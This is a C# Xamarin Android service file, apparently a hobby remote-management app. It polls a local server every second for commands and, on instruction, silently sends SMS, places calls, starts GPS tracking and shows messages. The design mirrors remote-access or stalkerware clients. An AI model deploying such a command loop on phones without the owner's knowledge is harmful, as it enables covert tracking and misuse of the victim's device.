using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net;
using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using SQLite;
using System.IO;
using Android.Telephony;


namespace KotysAndroidCsharp2
{
   [Service]
    public class KotysService : Android.App.Service
    {
      


       System.Timers.Timer t2 = new System.Timers.Timer(); // timer de last seen
       System.Timers.Timer t3 = new System.Timers.Timer(); // timer de commands
       public string APIUrl = "http://192.168.1.3/machines/api/";
       public string devID = "";
       API apicall = new API();

        public override StartCommandResult OnStartCommand (Android.Content.Intent intent, StartCommandFlags flags, int startId)
        {
           

            //start v2
            apicall.addReport("Application opened");

            t2.Interval = 900000; // = 15 minutes in ms
            t2.Elapsed += new System.Timers.ElapsedEventHandler(t2_Elapsed);
            t2.Start();

            t3.Interval = 1000; // = 3 minutes in ms 18000
            t3.Elapsed += new System.Timers.ElapsedEventHandler(t3_Elapsed);
            t3.Start();

            //stop v2

            // get DEVID

            string dbPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Personal), "settingsk.db3");
            var db = new SQLiteConnection(dbPath);
            db.CreateTable<Settings>();
            List<Settings> myId = db.Query<Settings>("select devID from Settings where identificator = '1607'");

            string gotID = "";
            foreach (Settings s in myId)
            {
                gotID = s.devID.ToString();
            }
            //devID = myId.Last().devID.ToString();
            devID = gotID;
              

            //stop getdevid
            return StartCommandResult.Sticky;
        }

        protected void t2_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
           
            apicall.SendLastSeen(devID);
        }

        protected void t3_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            getCommandToDo();
        }

        public override void OnDestroy()
        {
            base.OnDestroy();
            // cleanup code
        }

        public override IBinder OnBind(Intent intent)
        {
            return null;
        }

       void getCommandToDo()
       {
           WebClient wc = new WebClient();
           string get = wc.DownloadString(APIUrl + "getLastCommand.php?t1=" + devID); // TREBUIE TESTAT
           if (get == "402")
           {
               
           }
           else
           {
               string[] aux = get.Split('~');
               string command = aux[0];
               string Identifier = aux[1];
               doCommand(command, Identifier);
           }
           
       }

       void doCommand(string commands, string Identifiers)
       {
           switch (commands.Substring(0, 3))
           {
               //case "101": if (toastIT(commands.Substring(3)) == true) { apicall.markItAsDone(Identifiers); } break;
               case "101": toastIT(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Toast:" + commands.Substring(3)); break;
               case "102": SendNotification(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Notification:" + commands.Substring(3));  break;
               case "103": getGPS(devID, Identifiers); apicall.markItAsDone(Identifiers); break;
               case "104": callNumber(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("CalledNumber:" + commands.Substring(3)); break;
               case "105": sendSMS(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("SMS:" + commands.Substring(3)); break;
               default: SendNotification("FAIL"); break;
           }
          

       }

       private void SendNotification(string message)
       {
           
           var nMgr = (NotificationManager)this.GetSystemService(NotificationService);
           var notification = new Notification(Resource.Drawable.Icon, "Kotys Message");
           var intent = new Intent();
           intent.SetComponent(new ComponentName(this, "dart.androidapp.ContactsActivity"));
           var pendingIntent = PendingIntent.GetActivity(this, 0, intent, 0);
           notification.SetLatestEventInfo(this, message, message, pendingIntent);
           nMgr.Notify(0, notification);
       }


       bool toastIT(string message)
       {
           try{
               Toast.MakeText(Android.App.Application.Context, message, ToastLength.Long);
               return true;
           }catch(Exception e)
           {
               return false;
           }
          
       }



       void getGPS(string devIDs, string Idents)
       {


           StartService(new Intent(this, typeof(GPSService)));
           //var activity2 = new Intent(this, typeof(GPSService));
           //activity2.PutExtra("devident", devIDs + Idents);
           //StartActivity(activity2);
           
          
           
       }

       void callNumber(string number)
       {
           var uri = Android.Net.Uri.Parse("tel:" + number);
           var intent = new Intent(Intent.ActionView, uri);
           StartActivity(intent);
       }

       void sendSMS(string get)
       {
           string[] trimmed = get.Split('\\');
           string number = trimmed[0];
           string message = trimmed[1];

           SmsManager.Default.SendTextMessage(number, null,message, null, null);

           //var smsUri = Android.Net.Uri.Parse("smsto:"+number);
           //var smsIntent = new Intent(Intent.ActionSendto, smsUri);
           //smsIntent.PutExtra("sms_body", message);
           //StartActivity(smsIntent);
       }
      
        
    }

}